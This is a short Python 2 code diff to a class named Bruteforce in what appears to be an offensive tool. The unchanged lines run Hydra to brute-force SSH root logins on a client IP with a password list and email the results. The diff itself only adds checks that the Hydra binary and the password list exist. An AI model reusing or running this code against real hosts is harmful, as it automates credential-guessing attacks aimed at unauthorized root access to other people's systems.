@@ -19,6 +19,14 @@ class Bruteforce(object):
         hydraLocation = cfg.get('dirtybastard',  'hydra_location')
         listLocation = cfg.get('dirtybastard',  'password_list')
         
+        if not self.doesFileExist(hydraLocation):
+            print "Unable to find Hydra at given location: %s.\nAborting bruteforce." % (hydraLocation)
+            return
+        
+        if not self.doesFileExist(listLocation):
+            print "Unable to find password list at: %s.\nAborting bruteforce." % (listLocation)
+            return
+        
         cmd = [hydraLocation, self.clientip, "ssh", "-l", "root", "-P" , listLocation]
 
         p = subprocess.Popen(cmd,  stdout=subprocess.PIPE)
@@ -29,3 +37,11 @@ class Bruteforce(object):
         print "stdout:", out
         
         sendEmail('Hydra results ' + self.clientip,  out)
+        
+    def doesFileExist(self,  file):
+        try:
+           with open(file): pass
+        except IOError:
+           return False
+        
+        return True
